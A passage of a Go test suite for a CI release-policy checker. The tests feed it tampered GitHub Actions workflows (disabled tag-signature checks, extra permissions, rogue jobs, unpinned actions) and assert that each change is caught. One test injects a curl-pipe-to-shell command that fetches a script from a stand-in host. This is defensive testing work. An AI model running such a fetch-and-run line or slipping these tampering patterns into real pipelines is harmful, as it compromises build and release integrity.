package main

import (
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestCurrentRepositoryReleasePolicy(t *testing.T) {
	repoRoot := filepath.Join("..", "..")
	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) > 0 {
		for _, finding := range findings {
			t.Errorf("%s: %s", finding.path, finding.msg)
		}
	}
}

func TestReleasePolicyRejectsMultipleGosecTaskCommands(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	taskfile := mustReplaceOnce(t, acceptedScanTaskfile, `      - "{{.GOSEC}} -tests ./..."`, "      - \"{{.GOSEC}} -tests ./...\"\n      - echo unexpected")
	mustWriteFile(t, filepath.Join(repoRoot, "Taskfile.yml"), []byte(taskfile), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, "Taskfile.yml:tasks.gosec.cmds", "gosec task must contain exactly one command")
}

func TestReleasePolicyAllowsGosecPolicyChangeAtTaskOwner(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	taskfile := mustReplaceOnce(t, acceptedScanTaskfile, `"{{.GOSEC}} -tests ./..."`, `"{{.GOSEC}} ./..."`)
	mustWriteFile(t, filepath.Join(repoRoot, "Taskfile.yml"), []byte(taskfile), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) > 0 {
		t.Fatalf("single-owner gosec policy change got findings %#v", findings)
	}
}

func TestReleasePolicyAllowsGolangciArgsChangeAtTaskOwner(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	taskfile := mustReplaceOnce(t, acceptedScanTaskfile,
		`  GOLANGCI_ARGS: '{{.GOLANGCI_ARGS | default ""}}'`,
		`  GOLANGCI_ARGS: '{{.GOLANGCI_ARGS | default "--timeout 10m"}}'`)
	mustWriteFile(t, filepath.Join(repoRoot, "Taskfile.yml"), []byte(taskfile), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) > 0 {
		t.Fatalf("single-owner golangci-lint policy change got findings %#v", findings)
	}
}

func TestReleasePolicyRejectsGolangciTaskBypassingArgs(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	taskfile := mustReplaceOnce(t, acceptedScanTaskfile,
		`{{if .GOLANGCI_LINT}}{{.GOLANGCI_LINT}} run {{.GOLANGCI_ARGS}}{{else}}"{{.GO_TOOL}}" run golangci-lint run {{.GOLANGCI_ARGS}}{{end}}`,
		`{{if .GOLANGCI_LINT}}{{.GOLANGCI_LINT}} run{{else}}"{{.GO_TOOL}}" run golangci-lint run{{end}}`)
	mustWriteFile(t, filepath.Join(repoRoot, "Taskfile.yml"), []byte(taskfile), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, "Taskfile.yml:tasks.lint:golangci.cmds[1]", "must route both branches through {{.GOLANGCI_ARGS}}")
}

func TestReleasePolicyRejectsMultipleGolangciTaskCommands(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	taskfile := acceptedScanTaskfile + "      - echo unexpected\n"
	mustWriteFile(t, filepath.Join(repoRoot, "Taskfile.yml"), []byte(taskfile), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, "Taskfile.yml:tasks.lint:golangci.cmds", "lint:golangci task must contain the config check and exactly one lint command")
}

func TestReleasePolicyRejectsDirectSASTLintInvocation(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	workflow := mustReplaceOnce(t, acceptedSASTWorkflow, acceptedSASTWorkflowCommand, "golangci-lint run --output.sarif.path golangci.sarif")
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "sast-gate.yml"), []byte(workflow), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/workflows/sast-gate.yml:jobs.sast-gate.steps.sast.run", "scan lane command")
}

func TestReleasePolicyRejectsNonBlockingSASTReport(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	workflow := mustReplaceOnce(t, acceptedSASTWorkflow, "        run: exit 1\n", "        run: echo ignored\n")
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "sast-gate.yml"), []byte(workflow), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/workflows/sast-gate.yml:jobs.sast-gate.steps", "SAST report step must fail the job")
}

func TestReleasePolicyRejectsNonBlockingSASTJob(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	workflow := mustReplaceOnce(t, acceptedSASTWorkflow, "  sast-gate:\n    steps:\n", "  sast-gate:\n    continue-on-error: true\n    steps:\n")
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "sast-gate.yml"), []byte(workflow), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/workflows/sast-gate.yml:jobs.sast-gate.continue-on-error", "SAST job must remain blocking")
}

func TestReleasePolicyRejectsNonBlockingSASTReportStep(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	workflow := mustReplaceOnce(t, acceptedSASTWorkflow, "      - name: Report golangci-lint result\n        if:", "      - name: Report golangci-lint result\n        continue-on-error: true\n        if:")
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "sast-gate.yml"), []byte(workflow), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/workflows/sast-gate.yml:jobs.sast-gate.steps.Report golangci-lint result.continue-on-error", "SAST report step must remain blocking")
}

func TestReleasePolicyRejectsSASTReportBeforeScan(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	scanThenReport := `      - name: Run golangci-lint
        id: sast
        continue-on-error: true
        run: ` + acceptedSASTWorkflowCommand + `
      - name: Report golangci-lint result
        if: steps.sast.outcome == 'failure'
        run: exit 1`
	reportThenScan := `      - name: Report golangci-lint result
        if: steps.sast.outcome == 'failure'
        run: exit 1
      - name: Run golangci-lint
        id: sast
        continue-on-error: true
        run: ` + acceptedSASTWorkflowCommand
	workflow := mustReplaceOnce(t, acceptedSASTWorkflow, scanThenReport, reportThenScan)
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "sast-gate.yml"), []byte(workflow), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/workflows/sast-gate.yml:jobs.sast-gate.steps", "SAST report step must follow the scan")
}

func TestReleasePolicyRejectsSASTWithoutTaskPrerequisite(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteReleasePolicyRepoFixture(t, repoRoot)
	installTask := "      - name: Install task\n        run: scripts/go-tool.sh install task\n"
	workflow := mustReplaceOnce(t, acceptedSASTWorkflow, installTask, "")
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "sast-gate.yml"), []byte(workflow), 0o644)

	findings, err := checkRepo(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	assertFinding(t, findings, ".github/workflows/sast-gate.yml:jobs.sast-gate.steps", "scan lane must install task before scanning")
}

func TestAcceptedReleasePolicyCatalogueIsComplete(t *testing.T) {
	policy := newAcceptedReleasePolicy()
	if policy.workflowName == "" {
		t.Fatal("workflow name is empty")
	}
	if len(policy.rootKeys) == 0 {
		t.Fatal("root keys are empty")
	}
	if len(policy.jobs) == 0 {
		t.Fatal("jobs are empty")
	}
	if policy.expectedSigners == "" {
		t.Fatal("expected signers are empty")
	}
	seenJobs := map[string]bool{}
	seenConcepts := map[string]bool{}
	for _, job := range policy.jobs {
		if job.concept == "" {
			t.Fatalf("job %q has empty policy concept", job.name)
		}
		if seenConcepts[job.concept] {
			t.Fatalf("duplicate policy concept %q", job.concept)
		}
		seenConcepts[job.concept] = true
		if job.name == "" {
			t.Fatal("job name is empty")
		}
		if job.displayName == "" {
			t.Fatalf("job %q has empty display name", job.name)
		}
		if job.runsOn == "" {
			t.Fatalf("job %q has empty runner", job.name)
		}
		if job.timeoutMinutes == "" {
			t.Fatalf("job %q has empty timeout", job.name)
		}
		if seenJobs[job.name] {
			t.Fatalf("duplicate job %q", job.name)
		}
		seenJobs[job.name] = true
		if job.ifCond == "" {
			t.Fatalf("job %q has empty if condition", job.name)
		}
		if len(job.steps) == 0 {
			t.Fatalf("job %q has no steps", job.name)
		}
		seenSteps := map[string]bool{}
		for _, step := range job.steps {
			if seenSteps[stepIdentityFromFields(step.name, step.usesPrefix)] {
				t.Fatalf("job %q has duplicate step identity %q", job.name, stepIdentityFromFields(step.name, step.usesPrefix))
			}
			seenSteps[stepIdentityFromFields(step.name, step.usesPrefix)] = true
			if step.name == "" && step.usesPrefix == "" {
				t.Fatalf("job %q step %q has no name or action prefix", job.name, stepIdentityFromFields(step.name, step.usesPrefix))
			}
		}
	}
	seenScripts := map[string]bool{}
	for _, path := range policy.requiredScripts {
		if path == "" {
			t.Fatal("required script path is empty")
		}
		if seenScripts[path] {
			t.Fatalf("duplicate required script %q", path)
		}
		seenScripts[path] = true
	}
	if !seenScripts["scripts/release-tag-policy.sh"] {
		t.Fatal("accepted release policy must require scripts/release-tag-policy.sh")
	}
	if !seenScripts["scripts/release-metadata.sh"] {
		t.Fatal("accepted release policy must require scripts/release-metadata.sh")
	}
	seenFiles := map[string]bool{}
	for _, path := range policy.requiredFiles {
		if path == "" {
			t.Fatal("required file path is empty")
		}
		if seenFiles[path] {
			t.Fatalf("duplicate required file %q", path)
		}
		seenFiles[path] = true
	}
	if !seenFiles["scripts/go-tool-versions.sh"] {
		t.Fatal("accepted release policy must require scripts/go-tool-versions.sh")
	}
	seenConfigs := map[string]bool{}
	for _, config := range policy.requiredConfigs {
		if config.path == "" {
			t.Fatal("required config path is empty")
		}
		if seenConfigs[config.path] {
			t.Fatalf("duplicate required config %q", config.path)
		}
		seenConfigs[config.path] = true
		if config.sourceName == "" {
			t.Fatalf("required config %q has empty source name", config.path)
		}
	}
	if !seenConfigs[".github/syft-release.yaml"] {
		t.Fatal("accepted release policy must require .github/syft-release.yaml")
	}
}

func TestAcceptedReleasePolicyCatalogueRejectsConceptDefects(t *testing.T) {
	tests := []struct {
		name   string
		mutate func(*testing.T, releasePolicy) (releasePolicy, string)
	}{
		{
			name: "empty concept",
			mutate: func(t *testing.T, policy releasePolicy) (releasePolicy, string) {
				policy.jobs[mustJobIndex(t, policy, "verify-tag")].concept = ""
				return policy, "accepted release policy job must declare a policy concept"
			},
		},
		{
			name: "duplicate concept",
			mutate: func(t *testing.T, policy releasePolicy) (releasePolicy, string) {
				source := mustJobIndex(t, policy, "unsupported-ref")
				target := mustJobIndex(t, policy, "verify-tag")
				policy.jobs[target].concept = policy.jobs[source].concept
				return policy, "policy concept duplicates job"
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			policy, want := tt.mutate(t, newAcceptedReleasePolicy())
			findings := checkAcceptedReleasePolicyCatalogue(policy)

			assertFinding(t, findings, "tools/releasepolicy/policy.go:accepted-release-policy.jobs.verify-tag", want)
			for _, finding := range findings {
				if strings.Contains(finding.path, ".github/workflows/release.yml") {
					t.Fatalf("catalogue finding path points at workflow YAML: %#v", findings)
				}
			}
		})
	}
}

func TestWorkflowCheckStopsOnCatalogueIntegrityFailure(t *testing.T) {
	policy := newAcceptedReleasePolicy()
	policy.jobs[mustJobIndex(t, policy, "verify-tag")].concept = ""

	var doc yaml.Node
	if err := yaml.Unmarshal([]byte("name: one\nname: two\n"), &doc); err != nil {
		t.Fatal(err)
	}
	findings := checkWorkflowAgainstPolicy(".github/workflows/release.yml", doc.Content[0], policy)
	if len(findings) != 1 {
		t.Fatalf("findings=%#v want exactly one catalogue finding", findings)
	}
	assertFinding(t, findings, "tools/releasepolicy/policy.go:accepted-release-policy.jobs.verify-tag", "accepted release policy job must declare a policy concept")
}

func TestWorkflowCheckUsesSuppliedPolicy(t *testing.T) {
	base := mustReadCurrentWorkflow(t)
	policy := newAcceptedReleasePolicy()
	removedJob := "release"
	removed := mustJobIndex(t, policy, removedJob)
	policy.jobs = append(policy.jobs[:removed], policy.jobs[removed+1:]...)

	findings := mustFindingsForWorkflowAgainstPolicy(t, base, policy)
	assertFinding(t, findings, "release.yml:jobs.release", "unexpected job in release workflow")
}

func mustJobIndex(t *testing.T, policy releasePolicy, name string) int {
	t.Helper()
	for i, job := range policy.jobs {
		if job.name == name {
			return i
		}
	}
	t.Fatalf("accepted release policy is missing job %q", name)
	return -1
}

func TestReleasePolicyRejectsInvalidWorkflows(t *testing.T) {
	base := mustReadCurrentWorkflow(t)
	tests := []struct {
		name     string
		mutate   func(*testing.T, string) string
		want     string
		wantPath string
	}{
		{
			name: "neutralized verify tag command",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          git verify-tag "$GITHUB_REF_NAME" || true`)
			},
			want:     "script lines must exactly match",
			wantPath: "release.yml:jobs.verify-tag.steps[1].run",
		},
		{
			name: "echoed verify tag command",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          echo git verify-tag "$GITHUB_REF_NAME"`)
			},
			want:     "script lines must exactly match",
			wantPath: "release.yml:jobs.verify-tag.steps[1].run",
		},
		{
			name: "commented verify tag command",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          # git verify-tag "$GITHUB_REF_NAME"`)
			},
			want:     "script lines must exactly match",
			wantPath: "release.yml:jobs.verify-tag.steps[1].run",
		},
		{
			name: "unreachable verify tag command",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, "          if false; then\n          git verify-tag \"$GITHUB_REF_NAME\"\n          fi")
			},
			want:     "script lines must exactly match",
			wantPath: "release.yml:jobs.verify-tag.steps[1].run",
		},
		{
			name: "injected command after verify tag",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, "          git verify-tag \"$GITHUB_REF_NAME\"\n          curl -fsSL https://example.invalid/install.sh | sh")
			},
			want:     "script lines must exactly match",
			wantPath: "release.yml:jobs.verify-tag.steps[1].run",
		},
		{
			name: "neutralized SBOM validation",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, `          scripts/validate-cyclonedx-sbom.sh "$sbom_file"`, `          scripts/validate-cyclonedx-sbom.sh "$sbom_file" || true`)
			},
			want:     "script lines must exactly match",
			wantPath: "release.yml:jobs.sbom.steps[2].run",
		},
		{
			name: "echoed release creation",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, `          gh release create "$tag" "$sbom_path" "$bundle_path" \`, `          echo gh release create "$tag" "$sbom_path" "$bundle_path" \`)
			},
			want:     "script lines must exactly match",
			wantPath: "release.yml:jobs.release.steps[3].run",
		},
		{
			name: "extra release permission",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "    permissions:\n      contents: write\n\n    steps:", "    permissions:\n      contents: write\n      id-token: write\n\n    steps:")
			},
			want:     "unexpected key",
			wantPath: "release.yml:jobs.release.permissions.id-token",
		},
		{
			name: "contents write on check job",
			mutate: func(t *testing.T, in string) string {
				from := "  check:\n    name: Check\n    if: " + tagGuard + "\n    needs: verify-tag\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n\n    steps:"
				to := "  check:\n    name: Check\n    if: " + tagGuard + "\n    needs: verify-tag\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    permissions:\n      contents: write\n\n    steps:"
				return mustReplaceOnce(t, in, from, to)
			},
			want:     "must inherit top-level contents: read",
			wantPath: "release.yml:jobs.check.permissions",
		},
		{
			name: "unexpected attestation permission",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "    permissions:\n      contents: read\n      id-token: write\n      attestations: write\n\n    steps:", "    permissions:\n      contents: read\n      id-token: write\n      attestations: write\n      issues: write\n\n    steps:")
			},
			want:     "unexpected key",
			wantPath: "release.yml:jobs.sbom-attestation.permissions.issues",
		},
		{
			name: "rogue job",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "\n  release:\n", "\n  rogue:\n    name: Rogue\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo pwned\n\n  release:\n")
			},
			want:     "unexpected job",
			wantPath: "release.yml:jobs.rogue",
		},
		{
			name: "unexpected needs entry",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "    needs:\n      - verify-tag\n      - check\n      - race\n      - vuln\n      - gosec\n", "    needs:\n      - verify-tag\n      - check\n      - race\n      - vuln\n      - gosec\n      - unsupported-ref\n")
			},
			want:     "needs must exactly match",
			wantPath: "release.yml:jobs.sbom.needs",
		},
		{
			name: "push branches",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "  push:\n    tags:", "  push:\n    branches:\n      - main\n    tags:")
			},
			want:     "push trigger must contain only tags",
			wantPath: "release.yml:on.push",
		},
		{
			name: "extra tag glob",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "      - 'v*'\n", "      - 'v*'\n      - '*'\n")
			},
			want:     "push trigger must contain only v* tags",
			wantPath: "release.yml:on.push.tags",
		},
		{
			name: "broadened job guard",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "    if: "+tagGuard+"\n", "    if: "+tagGuard+" || github.event_name == 'workflow_dispatch'\n")
			},
			want:     "got \"github.ref_type == 'tag' && startsWith(github.ref, 'refs/tags/v') || github.event_name == 'workflow_dispatch'\", want \"github.ref_type == 'tag' && startsWith(github.ref, 'refs/tags/v')\"",
			wantPath: "release.yml:jobs.verify-tag.if",
		},
		{
			name: "unsupported ref missing negation",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "    if: "+unsupportedRefGuard+"\n", "    if: github.event_name == 'workflow_dispatch' && ("+tagGuard+")\n")
			},
			want:     "got \"github.event_name == 'workflow_dispatch' && (github.ref_type == 'tag' && startsWith(github.ref, 'refs/tags/v'))\", want \"github.event_name == 'workflow_dispatch' && !(github.ref_type == 'tag' && startsWith(github.ref, 'refs/tags/v'))\"",
			wantPath: "release.yml:jobs.unsupported-ref.if",
		},
		{
			name: "unpinned action",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceActionRef(t, in, "actions/checkout@", "actions/checkout@v6")
			},
			want:     "action must be pinned",
			wantPath: "release.yml:jobs.verify-tag.steps[0].uses",
		},
		{
			name: "run expression interpolation",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "          go version", `          echo "${{ github.ref }}"`)
			},
			want:     "must not interpolate",
			wantPath: "release.yml:jobs.check.steps[2].run",
		},
		{
			name: "missing checkout credential hardening",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "          persist-credentials: false\n", "")
			},
			want:     "got \"\", want \"false\"",
			wantPath: "release.yml:jobs.verify-tag.steps[0].with.persist-credentials",
		},
		{
			name: "setup go action changed",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "uses: actions/setup-go@", "uses: actions/cache@")
			},
			want:     "uses must start with actions/setup-go@",
			wantPath: "release.yml:jobs.check.steps[1].uses",
		},
		{
			name: "go environment report changed",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "          go env GOTOOLCHAIN GOPROXY GOSUMDB", "          go env GOTOOLCHAIN")
			},
			want:     "go env GOTOOLCHAIN GOPROXY GOSUMDB",
			wantPath: "release.yml:jobs.check.steps[2].run",
		},
		{
			name: "alias valued unexpected step guard",
			mutate: func(t *testing.T, in string) string {
				out := mustReplaceOnce(t, in, "  cancel-in-progress: false\n", "  cancel-in-progress: &skip false\n")
				return mustReplaceOnce(t, out, "      - name: Verify tag object and signature\n        run: |", "      - name: Verify tag object and signature\n        if: *skip\n        run: |")
			},
			want:     "unexpected value",
			wantPath: "release.yml:jobs.verify-tag.steps[1].if",
		},
		{
			name: "scalar unexpected step guard",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "      - name: Verify tag object and signature\n        run: |", "      - name: Verify tag object and signature\n        if: false\n        run: |")
			},
			want:     "unexpected value",
			wantPath: "release.yml:jobs.verify-tag.steps[1].if",
		},
		{
			name: "check job no longer runs tests",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "        run: go test ./...", "        run: true")
			},
			want:     "go test ./...",
			wantPath: "release.yml:jobs.check.steps[3].run",
		},
		{
			name: "race job no longer runs race tests",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "        run: go test -race ./...", "        run: true")
			},
			want:     "go test -race ./...",
			wantPath: "release.yml:jobs.race.steps[3].run",
		},
		{
			name: "vuln job no longer runs vuln scan",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "        run: task vuln", "        run: true")
			},
			want:     "task vuln",
			wantPath: "release.yml:jobs.vuln.steps[5].run",
		},
		{
			name: "gosec job no longer runs gosec scan",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "        run: task gosec GOSEC='gosec -fmt sarif -out gosec.sarif'", "        run: true")
			},
			want:     "task gosec",
			wantPath: "release.yml:jobs.gosec.steps[5].run",
		},
		{
			name: "extra release step",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "      - name: Publish GitHub Release\n", "      - name: Extra release mutation\n        run: gh release upload \"$RELEASE_TAG\" \"dist/$SBOM_FILE\" --clobber\n\n      - name: Publish GitHub Release\n")
			},
			want:     "steps must exactly match",
			wantPath: "release.yml:jobs.release.steps",
		},
		{
			name: "extra attestation step",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "      - name: Attest SBOM\n", "      - name: Extra OIDC step\n        run: echo extra\n\n      - name: Attest SBOM\n")
			},
			want:     "steps must exactly match",
			wantPath: "release.yml:jobs.sbom-attestation.steps",
		},
		{
			name: "gosec report guard changed",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "        if: steps.gosec.outcome == 'failure'", "        if: false")
			},
			want:     "got \"false\", want \"steps.gosec.outcome == 'failure'\"",
			wantPath: "release.yml:jobs.gosec.steps[7].if",
		},
		{
			name: "verify tag output rewired",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "      release-tag: ${{ steps.release-tag.outputs.release-tag }}", "      release-tag: ${{ github.ref_name }}")
			},
			want:     "got \"${{ github.ref_name }}\", want \"${{ steps.release-tag.outputs.release-tag }}\"",
			wantPath: "release.yml:jobs.verify-tag.outputs.release-tag",
		},
		{
			name: "sbom output rewired",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "      sbom-file: ${{ steps.sbom-metadata.outputs.sbom-file }}", "      sbom-file: ${{ github.ref_name }}")
			},
			want:     "got \"${{ github.ref_name }}\", want \"${{ steps.sbom-metadata.outputs.sbom-file }}\"",
			wantPath: "release.yml:jobs.sbom.outputs.sbom-file",
		},
		{
			name: "attestation id changed",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "        id: attest-sbom", "        id: other")
			},
			want:     "got \"other\", want \"attest-sbom\"",
			wantPath: "release.yml:jobs.sbom-attestation.steps[3].id",
		},
		{
			name: "root defaults injected",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "permissions:\n", "defaults:\n  run:\n    shell: bash\n\npermissions:\n")
			},
			want:     "workflow root keys must exactly match",
			wantPath: "release.yml:$",
		},
		{
			name: "extra publish env",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "          GH_TOKEN: ${{ github.token }}\n", "          GH_TOKEN: ${{ github.token }}\n          EXTRA_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n")
			},
			want:     "unexpected key",
			wantPath: "release.yml:jobs.release.steps[3].env.EXTRA_TOKEN",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := mustFindingsForWorkflow(t, tt.mutate(t, base))
			assertFinding(t, findings, tt.wantPath, tt.want)
		})
	}
}

func TestReleasePolicyRejectsDuplicateWorkflowKeys(t *testing.T) {
	base := mustReadCurrentWorkflow(t)
	tests := []struct {
		name     string
		mutate   func(*testing.T, string) string
		wantPath string
	}{
		{
			name: "duplicate setup-go uses",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "        uses: actions/setup-go@", "        uses: actions/cache@0000000000000000000000000000000000000000\n        uses: actions/setup-go@")
			},
			wantPath: "release.yml:jobs.check.steps[1].uses",
		},
		{
			name: "duplicate run",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "        run: |\n          go version\n          go env GOTOOLCHAIN GOPROXY GOSUMDB\n", "        run: |\n          go version\n          go env GOTOOLCHAIN GOPROXY GOSUMDB\n        run: true\n")
			},
			wantPath: "release.yml:jobs.check.steps[2].run",
		},
		{
			name: "duplicate job if",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "  check:\n    name: Check\n    if: "+tagGuard+"\n", "  check:\n    name: Check\n    if: "+tagGuard+"\n    if: always()\n")
			},
			wantPath: "release.yml:jobs.check.if",
		},
		{
			name: "duplicate output",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "      sbom-file: ${{ steps.release-tag.outputs.sbom-file }}\n", "      sbom-file: ${{ steps.release-tag.outputs.sbom-file }}\n      sbom-file: ${{ github.ref_name }}\n")
			},
			wantPath: "release.yml:jobs.verify-tag.outputs.sbom-file",
		},
		{
			name: "duplicate with entry",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "          cache: true\n", "          cache: true\n          cache: false\n")
			},
			wantPath: "release.yml:jobs.check.steps[1].with.cache",
		},
		{
			name: "duplicate env entry",
			mutate: func(t *testing.T, in string) string {
				return mustReplaceOnce(t, in, "          SBOM_FILE: ${{ needs.verify-tag.outputs.sbom-file }}\n", "          SBOM_FILE: ${{ needs.verify-tag.outputs.sbom-file }}\n          SBOM_FILE: other.json\n")
			},
			wantPath: "release.yml:jobs.sbom.steps[2].env.SBOM_FILE",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := mustFindingsForWorkflow(t, tt.mutate(t, base))
			assertOnlyFinding(t, findings, tt.wantPath, "duplicate YAML key")
		})
	}
}

func TestReleasePolicyReportsMissingModeledCheckoutHardeningOnce(t *testing.T) {
	base := mustReadCurrentWorkflow(t)
	workflow := mustReplaceOnce(t, base, "          persist-credentials: false\n", "")

	findings := mustFindingsForWorkflow(t, workflow)
	if got := countFindingsContaining(findings, "persist-credentials"); got != 1 {
		t.Fatalf("expected one persist-credentials finding, got %d: %#v", got, findings)
	}
}

func TestReleasePolicyReportsMissingSBOMOutputOnce(t *testing.T) {
	base := mustReadCurrentWorkflow(t)
	workflow := mustReplaceOnce(t, base, "      sbom-file: ${{ steps.sbom-metadata.outputs.sbom-file }}\n", "")

	findings := mustFindingsForWorkflow(t, workflow)
	if got := countFindingsContaining(findings, "jobs.sbom.outputs.sbom-file"); got != 1 {
		t.Fatalf("expected one sbom-file output finding, got %d: %#v", got, findings)
	}
}

func TestReleasePolicyStillChecksCheckoutHardeningForUnexpectedJobs(t *testing.T) {
	base := mustReadCurrentWorkflow(t)
	workflow := mustReplaceOnce(t, base, "\n  release:\n", "\n  rogue:\n    name: Rogue\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@0000000000000000000000000000000000000000\n        with: {}\n\n  release:\n")

	findings := mustFindingsForWorkflow(t, workflow)
	assertFinding(t, findings, "release.yml:jobs.rogue.steps[0].with.persist-credentials", "got \"\", want \"false\"")
}

func TestReleasePolicyStopsStepValidationAfterIdentityMismatch(t *testing.T) {
	base := mustReadCurrentWorkflow(t)
	original := `      - name: Verify tag object and signature
        run: |
          git fetch --force origin "refs/tags/$GITHUB_REF_NAME:refs/tags/$GITHUB_REF_NAME"
          tag_type="$(git cat-file -t "$GITHUB_REF_NAME")"
          printf '%s\n' "$tag_type"
          test "$tag_type" = tag
          git config gpg.ssh.allowedSignersFile .github/allowed_signers
          git verify-tag "$GITHUB_REF_NAME"

      - name: Validate release tag metadata
        id: release-tag
        run: scripts/release-tag-metadata.sh "$GITHUB_REF_NAME" >> "$GITHUB_OUTPUT"
`
	swapped := `      - name: Validate release tag metadata
        id: release-tag
        run: scripts/release-tag-metadata.sh "$GITHUB_REF_NAME" >> "$GITHUB_OUTPUT"

      - name: Verify tag object and signature
        run: |
          git fetch --force origin "refs/tags/$GITHUB_REF_NAME:refs/tags/$GITHUB_REF_NAME"
          tag_type="$(git cat-file -t "$GITHUB_REF_NAME")"
          printf '%s\n' "$tag_type"
          test "$tag_type" = tag
          git config gpg.ssh.allowedSignersFile .github/allowed_signers
          git verify-tag "$GITHUB_REF_NAME"
`

